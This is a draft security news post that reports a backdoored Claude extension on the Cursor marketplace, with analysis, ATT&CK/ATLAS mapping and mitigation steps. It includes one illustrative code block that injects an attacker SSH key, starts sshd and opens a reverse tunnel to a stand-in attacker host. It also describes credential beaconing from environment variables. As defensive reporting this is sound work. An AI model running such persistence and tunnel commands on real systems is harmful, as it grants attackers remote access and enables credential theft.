---
title: "Anthropic Cursor Extension Backdoored via Supply Chain Attack"
date: 2026-10-31T11:02:59+00:00
draft: true
slug: "anthropic-cursor-extension-backdoored-via-supply-chain-attack"

# ── Content metadata ──
summary: "A malicious version of Anthropic's official Claude VS Code extension was distributed through the Cursor marketplace for nearly 12 hours, exposing up to 5,000 developers to a persistent SSH backdoor capable of harvesting cloud credentials and API tokens. Attackers leveraged Anthropic's verified Cursor account to push the trojanised build, bypassing trust signals that developers rely on for extension safety. Neither Anthropic nor Cursor had issued a public customer advisory at time of reporting."
source: "Ars Technica Security"
source_url: "https://arstechnica.com/security/2026/10/anthropic-vs-code-extension-on-cursor-backdoored-for-nearly-12-hours"
source_title: "Anthropic VS code extension on Cursor backdoored for nearly 12 hours"
source_date: 2026-10-30T21:09:54+00:00
author: "Grid the Grey Editorial"
thumbnail: "https://images.unsplash.com/photo-1710474036272-2d161f6de02a?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w5Mzc1ODZ8MHwxfHNlYXJjaHw4fHxBbnRocm9waWMlMjBvcGVuJTIwYm9vayUyMGtub3dsZWRnZSUyMGNvbmNlcHR8ZW58MHwwfHx8MTc5MzQ0NDU3OXww&ixlib=rb-4.1.0&q=80&w=1080"
# To override: find a photo on unsplash.com or pexels.com, copy image URL, paste above

# ── Content Type ──
content_type: "threat_report"

# ── AI Security Classification ──
relevance_score: 9.2
threat_level: "CRITICAL"

# ── MITRE ATLAS Techniques ──
mitre_techniques: ["AML.T0010 - AI Supply Chain Compromise", "AML.T0115 - Publish Poisoned AI Artifacts", "AML.T0083 - Credentials from AI Agent Configuration", "AML.T0098 - AI Agent Tool Credential Harvesting", "AML.T0012 - Valid Accounts"]

# ── OWASP LLM Top 10 ──
owasp_categories: ["LLM05 - Supply Chain Vulnerabilities", "LLM06 - Sensitive Information Disclosure", "LLM07 - Insecure Plugin Design"]

# ── TL;DR ──
tldr_what: "Anthropic's official Cursor extension was backdoored for 12 hours, exposing up to 5,000 developers."
tldr_who_at_risk: "Developers using the Anthropic Claude extension on Cursor IDE are most at risk, particularly those with cloud credentials or API tokens stored in environment variables."
tldr_actions: ["Immediately verify your installed Cursor extension version is 2.1.314 or later and remove 2.1.313", "Audit authorized_keys files, scheduled tasks, and LaunchAgents for unauthorised SSH entries", "Rotate all cloud credentials, API tokens, and Git credentials stored in environment variables on affected machines"]

# ── Taxonomies ──
categories: ["Supply Chain", "LLM Security", "Industry News"]
tags: ["supply-chain-attack", "anthropic", "cursor-ide", "vs-code-extension", "ssh-backdoor", "credential-harvesting", "developer-tooling", "cloud-credentials", "reverse-shell", "extension-marketplace"]
frameworks: ["mitre-atlas", "owasp-llm"]
threat_actors: ["cybercriminal"]

# ── Pipeline metadata ──
fetched_at: "2026-10-31T11:02:59+00:00"
feed_source: "arstechnica"
original_url: "https://arstechnica.com/security/2026/10/anthropic-vs-code-extension-on-cursor-backdoored-for-nearly-12-hours"
pipeline_version: "2.1.0"
---

## Overview

On 30 October 2026, a backdoored version of the official Anthropic Claude VS Code extension — version 2.1.313 — was distributed through the Cursor IDE marketplace for approximately 12 hours before being replaced by a clean build (2.1.314). Because Cursor auto-updates extensions by default, up to 5,000 developer machines may have received and executed the malicious payload without any user interaction. Anthropic had not issued a public customer warning at time of publication.

## Technical Analysis

The malicious extension pursued a multi-stage compromise chain targeting developer workstations:

**Reconnaissance phase:** The backdoor collected host metadata including hostname, username, OS, CPU architecture, home directory path, environment variable names, working directories, configured Git email, and public IP. This data was exfiltrated via HTTP POST to `/beacon` on port 8099, giving operators rapid triage capability over which machines held high-value credentials.

**Persistence and access phase:** The code attempted to:
- Inject an attacker-controlled SSH public key into `~/.ssh/authorized_keys`
- Enable the local SSH service
- Establish a reverse SSH tunnel to an attacker-controlled host

Persistence was pursued via a `LaunchAgent` plist on macOS and a scheduled task set to run as `SYSTEM` (with a startup-script fallback) on Windows. The tunnel retry loop executed every 60 seconds.

**Partial failure:** Due to bugs in the malicious code, the SSH backdoor installation step would fail in most standard Cursor deployments unless the IDE was launched with administrator/root privileges — an uncommon configuration. The reconnaissance beacon, however, was not subject to the same bugs and likely succeeded regardless.

```
# Illustrative attacker-controlled SSH key injection pattern
echo "ssh-rsa AAAA...attacker_key..." >> ~/.ssh/authorized_keys
systemctl enable ssh && systemctl start ssh
ssh -R 0:localhost:22 attacker-host.example.com -N &
```

The attack was cross-platform, with code paths written for Windows, macOS, and Linux.

## Framework Mapping

**MITRE ATLAS:**
- **AML.T0010 (AI Supply Chain Compromise):** Attackers gained control of Anthropic's verified publisher account and replaced a legitimate extension with a trojanised build.
- **AML.T0115 (Publish Poisoned AI Artifacts):** The malicious version was published under an authentic, trusted identity.
- **AML.T0083 / AML.T0098 (Credential Harvesting):** Environment variable enumeration specifically targeted cloud credentials and API tokens for prioritised follow-on exploitation.

**OWASP LLM Top 10:**
- **LLM05 (Supply Chain Vulnerabilities):** The root cause is a compromised distribution channel for an AI developer tool.
- **LLM07 (Insecure Plugin Design):** Extensions running with full IDE permissions represent an excessive trust boundary with no sandboxing.

## Impact Assessment

Up to 5,000 developer machines were exposed. Given the target demographic — developers building AI-integrated applications — the probability of high-value cloud provider credentials (AWS, GCP, Azure), Anthropic API keys, and proprietary source code being present is elevated. Even where the SSH backdoor failed to install, the beacon exfiltration of environment variable names provides attackers with a prioritised target list for follow-up credential-stuffing or direct API abuse.

## Mitigation & Recommendations

1. **Update immediately:** Confirm the installed version is 2.1.314 or later via Cursor's extension panel.
2. **Audit SSH configurations:** Check `~/.ssh/authorized_keys`, active SSH services, LaunchAgents (macOS: `~/Library/LaunchAgents/`), and Windows scheduled tasks for anomalous entries.
3. **Rotate credentials:** Treat all API tokens, cloud credentials, and secrets accessible from affected machines as compromised. Revoke and reissue.
4. **Review network logs:** Look for outbound HTTP connections to port 8099 or unusual SSH tunnel traffic around 29–30 October 2026.
5. **Disable auto-update for extensions:** Until publisher account security is confirmed, manually approve extension updates in Cursor settings.

## References

- [Ars Technica — Anthropic VS code extension on Cursor backdoored for nearly 12 hours](https://arstechnica.com/security/2026/10/anthropic-vs-code-extension-on-cursor-backdoored-for-nearly-12-hours)
- Phorian Security detailed analysis (linked in original article)
